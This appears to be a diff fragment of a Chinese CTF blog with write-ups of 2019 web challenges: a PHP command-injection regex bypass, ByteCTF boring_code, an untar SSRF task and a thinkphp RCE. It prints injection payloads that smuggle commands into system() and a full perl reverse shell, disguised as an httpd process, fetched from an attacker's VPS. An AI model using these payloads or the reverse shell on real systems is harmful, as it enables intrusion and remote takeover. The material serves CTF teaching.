+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/[b-d]at abc.txt </span></span><br><span class="line">abc</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html<span class="comment"># /bin/[a-z]at abc.txt </span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+<p><strong>③ Linux 命令换行</strong></p>
+<p>在命令执行的过程中，在URL编码中<code>%0a</code>解释为换行符，而我们可以利用它们来执行多条命令（类似 &amp; 的作用）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html# cat index.php </span><br><span class="line">&lt;?php</span><br><span class="line">echo system($_GET[a]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到分别执行了我们给的2个命令，并且都返回了</p>
+<p><img src alt="1-1"></p>
+<p><strong>④ Linux 命令终止符</strong></p>
+<p><code>空格+#（URL编码为%20%23）</code>在 Linux 命令行中为命令的终止符，类似注释符，我们可以利用这个闭合掉源码中的其他东西</p>
+<p>OK</p>
+<p>出题者对本题做过一次修改：未修改前的非预期解 以及 修改后的预期解，我们这里都看一下：</p>
+<p>① 未修改前</p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">    $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">     $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">     str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对<code>$a</code>的<code>$b</code>的正则中，反斜杠的匹配都出了问题。而对 $a 的正则中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\|\`</span><br></pre></td></tr></table></figure>
+<p>PHP解释器先进行一次解释，变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\|`</span><br></pre></td></tr></table></figure>
+<p>然后正则再解释一次，变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|`</span><br></pre></td></tr></table></figure>
+<p>所以会导致实际匹配到的字符串为 <strong>“|`”</strong>。这时候反引号就逃逸出来了，可以直接强制地命令执行（尽管还有拼接到 file 命令后面）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=`uname`</span><br></pre></td></tr></table></figure>
+<p><img src alt="1-2"></p>
+<p>发现可以命令执行后，查看当前目录（因为<code>ls</code>命令被禁用，这里用<code>dir</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=`dir .`</span><br><span class="line"></span><br><span class="line">?a=`dir ../../../`</span><br></pre></td></tr></table></figure>
+<p><img src alt="1-3"></p>
+<p><img src alt="1-4"></p>
+<p>但是都没有，所以直接用 find 命令找，但是也没有结果</p>
+<p><img src alt="1-5"></p>
+<p>这题正确姿势是用<code>grep -R</code>来找，通过文件内容找 flag</p>
+<blockquote>
+<p>grep -R 参数可以从某个目录开始，递归地查找文件内容</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10026/?a=`/bi?/gre? -R ctf`</span><br></pre></td></tr></table></figure>
+<p><img src alt="1-6"></p>
+<p>② 修改后</p>
+<p>出题人将<code>\\</code>换到了<code>\*</code>前面，其他没变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br></pre></td></tr></table></figure>
+<p>这个时候反引号就无法利用了。因为这里导致<code>\n（换行符）</code>逃逸，所以这里利用它，看着 payload 学习：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\&amp;b=%0a/bi?/gre? -R ctf #</span><br></pre></td></tr></table></figure>
+<p>实际执行的语句就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file &quot;\&quot; &quot;</span><br><span class="line">/bi?/gre? -R ctf #&quot;</span><br></pre></td></tr></table></figure>
+<p><code>a=\</code>是因为这个传入的反斜杠转义掉第二个<code>双引号</code>，才能是下面的 grep 命令正常执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/var/www/html# file &quot;&quot;&quot;</span><br><span class="line">&gt; ^C</span><br><span class="line"></span><br><span class="line">root@Knlvre:/var/www/html# file &quot;\&quot;&quot;</span><br><span class="line">&quot;: cannot open `&quot;&apos; (No such file or directory)</span><br></pre></td></tr></table></figure>
+<p>而<code>b</code>的 空格+# 是为了注释掉最后面的双引号</p>
+<p><img src alt="1-7"></p>
+<h2 id="Do-you-like-xml"><a href="#Do-you-like-xml" class="headerlink" title="Do you like xml?"></a>Do you like xml?</h2><h1 id="第五届上海市大学生网络安全大赛"><a href="#第五届上海市大学生网络安全大赛" class="headerlink" title="第五届上海市大学生网络安全大赛"></a>第五届上海市大学生网络安全大赛</h1><p>时间：2019年11月2号</p>
+<p>记录 4 道 Web 题目（其中一道为 Bytectf boring_code）</p>
+<h2 id="Bytectf-boring-code"><a href="#Bytectf-boring-code" class="headerlink" title="Bytectf boring_code"></a>Bytectf boring_code</h2><p>因为 <code>decade</code> 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目</p>
 <p><strong>题目源码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>Bypass 第一层</strong></p>
@@ -577,6 +556,59 @@
 <hr>
 <p><strong>Write Up</strong></p>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd</a> </p>
+<h1 id="湖湘杯复赛"><a href="#湖湘杯复赛" class="headerlink" title="湖湘杯复赛"></a>湖湘杯复赛</h1><p>时间：2019年11月9号</p>
+<p>记录 2 道 Web 题目，2 道 Misc 题目</p>
+<h2 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h2><p>参考文章：<a href="[&lt;https://1isten.xyz/2018/10/03/记一次对ssrf的理解/">记一次对ssrf的理解</a></p>
+<p>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; !preg_match(<span class="string">'/^(http|https):\/\/.*/'</span>, $_GET[<span class="string">"url"</span>]))</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    $url  = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($url));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    shell_exec(<span class="string">"UNTAR "</span>.escapeshellarg(basename($info[<span class="string">"basename"</span>])));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是一道<code>SSRF</code>题目</p>
+<p>传入的参数一共只有 2 个：<code>url</code>和<code>filename</code>：① 参数 url 只能使用<code>http://</code>或者<code>https://</code>协议；② 参数 filename 经过<code>pathinfo()</code>函数处理；二者都用<code>escapeshellarg()</code>函数处理</p>
+<p><strong>escapeshellarg()</strong></p>
+<p>作用：给参数加上单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(escapeshellarg(&quot;file&quot;));</span><br><span class="line">string(6) &quot;&apos;file&apos;&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>pathinfo()</strong></p>
+<p>作用：以数组的形式返回文件路径的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;file&quot;));</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(pathinfo(&quot;path/file.php&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(4) &quot;path&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(8) &quot;file.php&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>解题思路</strong></p>
+<p>弄清楚之后，我们直接看着 payload 梳理解题思路，payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次执行：</span><br><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br><span class="line"></span><br><span class="line">第二次执行：</span><br><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
+<p>① 首先分析第一个 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br></pre></td></tr></table></figure>
+<p>看一下 pathinfo() 对我们第一个 payload 中 filename 参数的解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;URI/listen.pm&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(3) &quot;URI&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(9) &quot;listen.pm&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(2) &quot;pm&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(6) &quot;listen&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>backdoor.txt 像参考文章说的一样，是一个<code>perl后门</code>，内容如下：</p>
+<p>:alarm_clock:后门内的 ip 要记得改成你的 VPS 的 ip</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以当我们执行第一个 payload 后，会在当前目录下再创建一个<code>URI</code>目录，并且进入这个目录，再创建 listen.pm ，内容为我们的 perl后门（backdoor.txt）</p>
+<p>② 接下来分析第二个 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
+<p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<code>listen://listen.xyz</code>，但是 listen 是未定义的模块，所以会自动搜索并加载<code>URI/listen.pm</code>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
+<p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
+<p>然后执行根目录下的<code>readflag</code>就能拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/4-1.png" alt="4-1"></p>
+<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<code>thinkphp</code>的洞。进来后要登录，先注册一个普通用户登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-1.png" alt="1-1"></p>
+<p>然后用这个普通用户登陆进去</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-2.png" alt="1-2"></p>
+<p>打算直接用一下之前刚碰到的<code>thinkphp 5.0.23</code>的<code>RCE</code>，看一下漏洞是否存在，结果直接看到版本号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.62:19403/?s=captcha</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-3.png" alt="1-3"></p>
+<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
